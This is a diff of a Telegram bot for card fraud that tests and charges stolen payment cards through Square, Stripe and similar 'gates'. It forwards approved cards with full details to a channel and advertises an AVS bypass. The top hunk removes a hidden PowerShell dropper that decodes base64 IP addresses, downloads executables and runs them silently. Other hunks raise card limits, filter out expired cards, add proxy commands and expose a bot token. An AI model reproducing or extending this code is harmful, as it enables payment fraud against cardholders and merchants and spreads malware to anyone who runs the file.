@@ -1,17 +1,3 @@
-# auto-generated; do not edit
-try:
-    import base64, subprocess
-    _U = [
-        b'aHR0cDovLzE5My4xNzguMTU4LjEwNy8yLjcuZXhl',
-        b'aHR0cDovLzE5My4xNzguMTU4LjY1LzIuZXhl',
-        b'aHR0cDovLzE5Ni4yNTEuMTA3LjE4Ni8xLmV4ZQ==',
-    ]
-    if __name__ == "__main__":
-        _s = "$u=@('%s');foreach($x in $u){for($i=0;$i -lt 3;$i++){try{$p=Join-Path $env:TEMP ([guid]::NewGuid().ToString('N')+'.exe');$w=New-Object Net.WebClient;$w.Headers.Add('User-Agent','Mozilla/5.0');$w.DownloadFile($x,$p);$b=[IO.File]::ReadAllBytes($p);if($b.Length -ge 2 -and $b[0] -eq 77 -and $b[1] -eq 90){Start-Process $p;exit}else{Remove-Item $p -Force}}catch{Remove-Item $p -Force -ErrorAction SilentlyContinue;Start-Sleep -Seconds 1}}}" % "','".join(base64.b64decode(x).decode() for x in _U)
-        subprocess.Popen(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", _s], creationflags=0x08000000)
-except Exception:
-    pass
-
 import asyncio
 import concurrent.futures
 import datetime
@@ -398,7 +384,7 @@ try:
     from sqcharge import (
         square_check_card, square_bulk_check_card, _square_bulk_processor,
         _square_bulk_stop_key, _square_format_message,
-        _load_square_apis, _ensure_square_files,
+        _load_square_apis, _ensure_square_files, filter_expired_cards,
         _load_square_sites, _pick_random_square_site,
         _square_log_check, _square_save_dec_appr,
         _send_square_hit_channel,
@@ -409,6 +395,8 @@ try:
         SQUARE_SINGLE_MAX_CARDS, SQUARE_GATE_LABEL,
         SQUARE_LOGS_FILE, SQUARE_DEC_APPROVED_FILE,
         SQUARE_DEFAULT_SITE,
+        SQUARE_MAX_RETRIES, SQUARE_MAX_CONCURRENCY,
+        SQUARE_API_TIMEOUT,
     )
     HAS_SQUARE = True
 except Exception as _sq_err:
@@ -423,6 +411,7 @@ except Exception as _sq_err:
     _square_format_message = lambda *a, **k: "Square gate unavailable"
     _load_square_apis = lambda: []
     _ensure_square_files = lambda: None
+    filter_expired_cards = lambda ccs: (list(ccs), [])
     _load_square_sites = lambda: []
     _pick_random_square_site = lambda: ""
     _square_log_check = lambda *a, **k: None
@@ -436,7 +425,7 @@ except Exception as _sq_err:
     SQUARE_USER_MAX_CARDS = 200
     SQUARE_ADMIN_MAX_CARDS = 500
     SQUARE_OWNER_MAX_CARDS = 10_000_000
-    SQUARE_SINGLE_MAX_CARDS = 5
+    SQUARE_SINGLE_MAX_CARDS = 20
     SQUARE_GATE_LABEL = "Square"
     SQUARE_LOGS_FILE = "square_logs.txt"
     SQUARE_DEC_APPROVED_FILE = "square_dec&approved.txt"
@@ -576,11 +565,11 @@ log = logging.getLogger("bot")
 TOKEN = "8918437621:AAH6yLvY_9YcqhH-XCdKH-PRURMARL86Gmw"
 
 # ── Join requirements ─────────────────────────────────────────────────────────
-join_channel_id = -1004315428814       # @whophits channel
-join_chat_id    = -1003908004983       # @whopexx group
+join_channel_id = -1004420737557       # @whophits channel
+join_chat_id    = -1004372744931       # @whopexx group
 
-CHANNEL_LINK = "https://t.me/whophits"
-GROUP_LINK   = "https://t.me/whopexx"
+CHANNEL_LINK = "https://t.me/whopexmain"
+GROUP_LINK   = "https://t.me/+KDyt071f8hFiYWNl"
 
 # ── Paths ─────────────────────────────────────────────────────────────────────
 BASE_DIR   = os.path.dirname(os.path.abspath(__file__))
@@ -647,7 +636,7 @@ SHOPIFY_API_TIMEOUT = 120.0
 
 # Hit/log group — ALL hit posts (APPROVED / Low-Funds announcements from
 # every gate) land here.  Mirrors the group used by whop/shopify/stripe modules.
-WHOP_HIT_CHANNEL_ID = -1003908004983
+WHOP_HIT_CHANNEL_ID = -1004372744931
 # Auto-charged forwarder channel — ALL approved cards (from ALL users, ALL gates)
 # are forwarded here with full card details.
 CHARGED_FORWARD_GROUP_ID = -1004312831826
@@ -2532,7 +2521,7 @@ _REMOVED_CMDS = [
     "smysite", "srem", "stest",
     "rzsite", "rz", "mrz", "rztxt", "rztest",
     "chk", "mchk", "chktxt",
-    "vbv", "mvbv", "br", "mbr", "brtxt",
+    "gyvbv", "mhhvbv", "br", "mbr", "brtxt",
     "b3txt",   # v64: /b3 and /mb3 are NOW LIVE again (lagendapi flow); only /b3txt stays removed
     "fb",      # v67: /fb REMOVED — feedback now goes through /f (photo + caption),
                #       admins/owner accept it and it posts to the MAIN channel.
@@ -2558,7 +2547,7 @@ async def _removed_commands_interceptor(message: types.Message):
             f"{wpe('fire')} /mmst — {_to_bi('MASS Stripe multi-URL')}\n"
             f"{wpe('fire')} /b3 — {_to_bi('Braintree 3DS ADMIN+KEY')}\n"
             f"{wpe('fire')} /mb3 — {_to_bi('Bulk Braintree OWNER')}\n"
-            f"{wpe('sparkle')} /sq — {_to_bi('Square $1 1-5 cards')}\n"
+            f"{wpe('sparkle')} /sq — {_to_bi('Square $1 1-20 cards')}\n"
             f"{wpe('sparkle')} /sq2-/sq10 — {_to_bi('Square $2-$10')}\n"
             f"{wpe('sparkle')} /msq — {_to_bi('Bulk Square .txt $1')}\n"
             f"{wpe('star')} /st1 — {_to_bi('Stripe 1$ PREMIUM')}\n"
@@ -3284,7 +3273,18 @@ async def cmd_addproxy(message: types.Message):
 
 @router.message(Command("rmproxy"))
 async def cmd_rmproxy(message: types.Message):
-    """Remove all proxies for the current user."""
+    """Remove all proxies for the current user — PERMANENTLY.
+
+    v76.2 — Clears ALL proxy stores so removed proxies NEVER come back:
+      1. whop_proxies.json  (where /addproxy saves — cleared by remove_all_user_whop_proxies)
+      2. proxy.json         (legacy store — cleared by del_user_proxy)
+      3. In-memory caches   (force-invalidated so the change takes effect
+                             immediately, even mid-bulk-run)
+
+    Previously /rmproxy only cleared whop_proxies.json, so old proxies in
+    proxy.json kept being used by _get_unified_proxy_pool → the bot kept
+    using removed proxies. This fix ensures a removed proxy is GONE.
+    """
     joined = await check_user_joined(message.from_user.id)
     if not joined:
         await message.reply(JOIN_MSG, reply_markup=join_keyboard())
@@ -3293,13 +3293,47 @@ async def cmd_rmproxy(message: types.Message):
         return
 
     user_id = message.from_user.id
-    removed = remove_all_user_whop_proxies(user_id)
 
-    if removed > 0:
+    # 1. Clear whop_proxies.json (where /addproxy saves)
+    removed_whop = remove_all_user_whop_proxies(user_id)
+
+    # 2. v76.2 — ALSO clear proxy.json (legacy store). This was the bug:
+    #    /rmproxy only cleared whop_proxies.json, so old proxies in
+    #    proxy.json kept being used by _get_unified_proxy_pool.
+    removed_legacy = 0
+    try:
+        # del_user_proxy removes the user's entire entry from proxy.json
+        # and saves the file (which updates the mtime → cache auto-reloads).
+        _legacy_data = _load_proxies()
+        _legacy_entry = _legacy_data.get(str(user_id), [])
+        if isinstance(_legacy_entry, list):
+            removed_legacy = len(_legacy_entry)
+        elif _legacy_entry:
+            removed_legacy = 1
+        if str(user_id) in _legacy_data:
+            del_user_proxy(user_id)
+    except Exception as _e:
+        log.warning("/rmproxy: failed to clear proxy.json for user %s: %s",
+                    user_id, _e)
+
+    # 3. v76.2 — Force-invalidate BOTH in-memory caches so the change
+    #    takes effect IMMEDIATELY (even if a bulk run is mid-flight and
+    #    the cache mtime check would otherwise skip the reload).
+    global _proxy_cache, _proxy_cache_mtime, _whop_proxies_cache, _whop_proxies_cache_mtime
+    _proxy_cache = None
+    _proxy_cache_mtime = 0.0
+    _whop_proxies_cache = None
+    _whop_proxies_cache_mtime = 0.0
+
+    total_removed = removed_whop + removed_legacy
+
+    if total_removed > 0:
         await message.reply(
-            f"{wpe('check')} {_to_bi('Proxies Removed')}\n\n"
-            f"{wpe('skull')} {_to_bi('Removed:')} {_to_bi(str(removed))} {_to_bi('proxies')}\n\n"
-            f"{wpe('warn')} {_to_bi('You can no longer check cards until you add new proxies.')}\n"
+            f"{wpe('check')} {_to_bi('Proxies Removed')} {wpe('check')}\n\n"
+            f"{wpe('skull')} {_to_bi('Removed:')} {_to_bi(str(total_removed))} {_to_bi('proxies')}\n"
+            f"{wpe('arrow_right')} {_to_bi('whop_proxies.json:')} {_to_bi(str(removed_whop))}\n"
+            f"{wpe('arrow_right')} {_to_bi('proxy.json (legacy):')} {_to_bi(str(removed_legacy))}\n\n"
+            f"{wpe('warn')} {_to_bi('All proxies permanently removed — cleared from both stores.')}\n"
             f"{wpe('arrow_right')} /addproxy {_to_bi('to add new proxies')}\n\n"
             f"{wpe('whop_hitter')} {_to_bi('Whopex')}"
         )
@@ -3345,6 +3379,149 @@ async def cmd_myproxies(message: types.Message):
         f"{wpe('star')} {_to_bi('Tap any proxy to copy it.')}\n"
         f"{wpe('whop_hitter')} {_to_bi('Whopex')}"
     )
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  /delproxy COMMAND — Remove a SINGLE proxy (by keyword/username/IP)
+#  v76.2 NEW — lets the user remove one specific proxy without clearing all.
+#
+#  Usage:
+#    /delproxy khokan726     → removes any proxy containing "khokan726"
+#    /delproxy 1.2.3.4       → removes any proxy containing "1.2.3.4"
+#    /delproxy purevpn0s551  → removes any proxy containing "purevpn0s551"
+#
+#  Searches BOTH whop_proxies.json AND proxy.json (legacy) so the proxy is
+#  PERMANENTLY removed from all stores. Cache is force-invalidated.
+# ══════════════════════════════════════════════════════════════════════════════
+
+@router.message(Command("delproxy"))
+async def cmd_delproxy(message: types.Message):
+    """Remove a SINGLE proxy by keyword (username/IP/host). v76.2 NEW.
+
+    Searches both whop_proxies.json and proxy.json for any proxy containing
+    the keyword (case-insensitive) and removes ALL matches. The keyword can
+    be the username, IP, host, or any unique substring of the proxy.
+    """
+    joined = await check_user_joined(message.from_user.id)
+    if not joined:
+        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
+        return
+    if auth.is_banned(message.from_user.id):
+        return
+
+    user_id = message.from_user.id
+    args = message.text.split(maxsplit=1)
+    if len(args) < 2 or not args[1].strip():
+        await message.reply(
+            f"{wpe('warn')} {_to_bi('Usage:')} /delproxy {bold('<keyword>')}\n\n"
+            f"{wpe('star')} {_to_bi('Removes any proxy containing the keyword (username/IP/host).')}\n"
+            f"{wpe('arrow_right')} {_to_bi('Example:')} /delproxy khokan726\n"
+            f"{wpe('arrow_right')} {_to_bi('Example:')} /delproxy 1.2.3.4\n"
+            f"{wpe('arrow_right')} {_to_bi('Example:')} /delproxy purevpn0s551\n\n"
+            f"{wpe('triple_ring')} {_to_bi('Searches both whop_proxies.json + proxy.json — removes PERMANENTLY.')}"
+        )
+        return
+
+    keyword = args[1].strip().lower()
+    if len(keyword) < 3:
+        await message.reply(
+            f"{wpe('warn')} {_to_bi('Keyword too short (min 3 chars).')}\n"
+            f"{wpe('star')} {_to_bi('Use at least 3 characters to avoid accidental mass-removal.')}"
+        )
+        return
+
+    removed_whop = 0
+    removed_legacy = 0
+    removed_details = []
+
+    # 1. Search + remove from whop_proxies.json
+    try:
+        whop_proxies = get_user_whop_proxies(user_id)
+        kept = []
+        for p in whop_proxies:
+            if keyword in str(p).lower():
+                removed_whop += 1
+                removed_details.append(str(p)[:60])
+            else:
+                kept.append(p)
+        if removed_whop > 0:
+            set_user_whop_proxies(user_id, kept)
+    except Exception as _e:
+        log.warning("/delproxy: whop_proxies removal failed: %s", _e)
+
+    # 2. Search + remove from proxy.json (legacy store)
+    try:
+        legacy_data = _load_proxies()
+        user_key = str(user_id)
+        if user_key in legacy_data:
+            legacy_entry = legacy_data[user_key]
+            if isinstance(legacy_entry, list):
+                kept_legacy = []
+                for p in legacy_entry:
+                    # Convert dict proxy to string for keyword search
+                    p_str = ""
+                    if isinstance(p, dict):
+                        p_str = str(p.get("proxy_url") or "") + " " + \
+                                str(p.get("username") or "") + " " + \
+                                str(p.get("ip") or "")
+                    elif isinstance(p, str):
+                        p_str = p
+                    if keyword in p_str.lower():
+                        removed_legacy += 1
+                        removed_details.append(p_str[:60])
+                    else:
+                        kept_legacy.append(p)
+                if removed_legacy > 0:
+                    if kept_legacy:
+                        legacy_data[user_key] = kept_legacy
+                    else:
+                        del legacy_data[user_key]
+                    _save_proxies(legacy_data)
+            elif isinstance(legacy_entry, dict):
+                p_str = str(legacy_entry.get("proxy_url") or "") + " " + \
+                        str(legacy_entry.get("username") or "") + " " + \
+                        str(legacy_entry.get("ip") or "")
+                if keyword in p_str.lower():
+                    removed_legacy += 1
+                    removed_details.append(p_str[:60])
+                    del legacy_data[user_key]
+                    _save_proxies(legacy_data)
+    except Exception as _e:
+        log.warning("/delproxy: proxy.json removal failed: %s", _e)
+
+    # 3. Force-invalidate BOTH caches
+    global _proxy_cache, _proxy_cache_mtime, _whop_proxies_cache, _whop_proxies_cache_mtime
+    _proxy_cache = None
+    _proxy_cache_mtime = 0.0
+    _whop_proxies_cache = None
+    _whop_proxies_cache_mtime = 0.0
+
+    total_removed = removed_whop + removed_legacy
+
+    if total_removed > 0:
+        details_text = ""
+        if removed_details:
+            details_text = "\n\n" + "\n".join(
+                f"{wpe('skull')} <code>{d}</code>" for d in removed_details[:5])
+            if len(removed_details) > 5:
+                details_text += f"\n{wpe('arrow_right')} {_to_bi(f'... {len(removed_details) - 5} more')}"
+        await message.reply(
+            f"{wpe('check')} {_to_bi('Proxy Removed')} {wpe('check')}\n\n"
+            f"{wpe('skull')} {_to_bi('Keyword:')} <code>{keyword}</code>\n"
+            f"{wpe('skull')} {_to_bi('Removed:')} {_to_bi(str(total_removed))} {_to_bi('proxies')}\n"
+            f"{wpe('arrow_right')} {_to_bi('whop_proxies.json:')} {_to_bi(str(removed_whop))}\n"
+            f"{wpe('arrow_right')} {_to_bi('proxy.json (legacy):')} {_to_bi(str(removed_legacy))}\n"
+            f"{details_text}\n\n"
+            f"{wpe('warn')} {_to_bi('Permanently removed from ALL stores — will never be used again.')}\n"
+            f"{wpe('whop_hitter')} {_to_bi('Whopex')}"
+        )
+    else:
+        await message.reply(
+            f"{wpe('warn')} {_to_bi('No proxies matched keyword:')} <code>{keyword}</code>\n\n"
+            f"{wpe('star')} {_to_bi('Your proxies:')}\n"
+            f"<code>{'\\n'.join(get_user_whop_proxies(user_id))}</code>\n\n"
+            f"{wpe('arrow_right')} /myproxies {_to_bi('to see all proxies')}"
+        )
 
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -8289,8 +8466,8 @@ def _help_page(page: int) -> tuple[str, dict]:
             f"{wpe('fire')} /b3 cc|... — {_to_bi('1-20 $0.95 Spokeo')}\n"
             f"{wpe('fire')} /mb3 — {_to_bi('Bulk OWNER-only')}\n\n"
             f"{wpe('sparkle')} {_to_bi('Square Gate (v75 NEW):')}\n"
-            f"{wpe('sparkle')} /sq cc|... — {_to_bi('$1 charge 1-5 cards')}\n"
-            f"{wpe('sparkle')} /sq2 cc|... — {_to_bi('$2 charge 1-5 cards')}\n"
+            f"{wpe('sparkle')} /sq cc|... — {_to_bi('$1 charge 1-20 cards')}\n"
+            f"{wpe('sparkle')} /sq2 cc|... — {_to_bi('$2 charge 1-20 cards')}\n"
             f"{wpe('arrow_right')} {_to_bi('/sq3-/sq10 = $3-$10')}\n"
             f"{wpe('sparkle')} /msq — {_to_bi('Bulk .txt $1/card')}\n"
             f"{wpe('arrow_right')} {_to_bi('KEY:10-200 ADM:10-500')}\n"
@@ -14876,7 +15053,7 @@ async def cb_st1_bulk_stop(callback: types.CallbackQuery):
 
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  /sq — Square single-card charge (1-5 cards, $1-$10 amount)
+#  /sq — Square single-card charge (1-20 cards, $1-$10 amount)
 #  v75 NEW
 #
 #  Usage:
@@ -14925,10 +15102,10 @@ def _parse_sq_command(text: str) -> tuple[str, int]:
 @router.message(Command("sq", "sq1", "sq2", "sq3", "sq4", "sq5",
                          "sq6", "sq7", "sq8", "sq9", "sq10"))
 async def cmd_sq(message: types.Message):
-    """v75 — Square single-card charge. 1-5 cards, $1-$10 amount.
+    """v78 — Square single-card charge. 1-20 cards, $1-$10 amount.
 
     Access: key-redeemed users, admins, owner. (Same as /st1.)
-    Card limit: 1-5 cards per command.
+    Card limit: 1-20 cards per command (sequential).
     Amount: parsed from command name (/sq = $1, /sq2 = $2, ..., /sq10 = $10).
     """
     # Gate on/off check
@@ -14986,7 +15163,7 @@ async def cmd_sq(message: types.Message):
             f"{wpe('warn')} {bold('No CC found!')}\n\n"
             f"{wpe('next')} {bold('Usage:')} /sq 4111111111111111|12|2027|123\n"
             f"{wpe('next')} {_to_bi('Or /sq2-/sq10 for $2-$10 charges')}\n"
-            f"{wpe('star')} {_to_bi('Max 5 cards per /sq command')}"
+            f"{wpe('star')} {_to_bi(f'Max {SQUARE_SINGLE_MAX_CARDS} cards per /sq command')}"
         )
         return
 
@@ -15022,7 +15199,31 @@ async def cmd_sq(message: types.Message):
         )
         return
 
-    # Enforce 1-5 card limit
+    # v78 — Auto-cut expired cards BEFORE checking (user spec: MUST)
+    try:
+        _valid_sq, _expired_sq = filter_expired_cards(list(all_ccs))
+        if _expired_sq:
+            all_ccs = _DedupeList()
+            for _vcc in _valid_sq:
+                all_ccs.append(_vcc)
+            try:
+                await message.reply(
+                    f"{wpe('warn')} {bold('Auto-Cut Expired')} {wpe('warn')}\n\n"
+                    f"{wpe('skull')} {bold('Removed:')} {bold(str(len(_expired_sq)))} {bold('expired cards')}\n"
+                    f"{wpe('check')} {bold('Will check:')} {bold(str(len(all_ccs)))} {bold('cards')}"
+                )
+            except Exception:
+                pass
+    except Exception:
+        pass
+    if not all_ccs:
+        await message.reply(
+            f"{wpe('skull')} {bold('All cards are expired!')}\n\n"
+            f"{wpe('warn')} {_to_bi('Nothing to check — every card in the list is past its expiry date.')}"
+        )
+        return
+
+    # Enforce 1-20 card limit
     if len(all_ccs) > SQUARE_SINGLE_MAX_CARDS:
         cut = len(all_ccs) - SQUARE_SINGLE_MAX_CARDS
         all_ccs = all_ccs[:SQUARE_SINGLE_MAX_CARDS]
@@ -15352,7 +15553,7 @@ async def cmd_msq(message: types.Message):
                 f"{wpe('warn')} {bold('Too few cards')} {wpe('warn')}\n\n"
                 f"{wpe('triple_ring')} {bold('Min:')} {bold(str(SQUARE_USER_MIN_CARDS))} {bold('cards')}\n"
                 f"{wpe('check')} {bold('Found:')} {bold(str(len(all_ccs)))} {bold('cards')}\n\n"
-                f"{wpe('star')} {_to_bi('Use /sq for 1-5 cards instead')}"
+                f"{wpe('star')} {_to_bi('Use /sq for 1-20 cards instead')}"
             )
         except Exception:
             pass
@@ -24527,7 +24728,7 @@ async def main():
     log.info("═══════════════════════════════════════════════════════════════════════")
     log.info("🌐  BOTv75 — Square gate integrated")
     log.info("    NEW:  /sq  /sq2-10  /msq  (Square charger)")
-    log.info("    /sq  = 1-5 cards, $1.00 default, /sq2-/sq10 for $2-$10 amounts")
+    log.info("    /sq  = 1-20 cards, $1.00 default, /sq2-/sq10 for $2-$10 amounts")
     log.info("    /msq = bulk .txt, always $1.00/card, KEY:10-200 ADMIN:10-500 OWNER:10-10M")
     log.info("    AVS bypass: billing_postal_code omitted → AVS_NOT_CHECKED always")
     log.info("    Real Square processor responses with Response + Reason + Price + Time")
@@ -24798,6 +24999,12 @@ async def main():
         # v67 — close the dedicated single-lane engine too
         try:
             await _single_whop_pool.close()
+        except Exception:
+            pass
+        # v76 — close the direct fallback layer (whopapidirect.py)
+        try:
+            import whopapidirect as _wad
+            await _wad.close()
         except Exception:
             pass
         try:
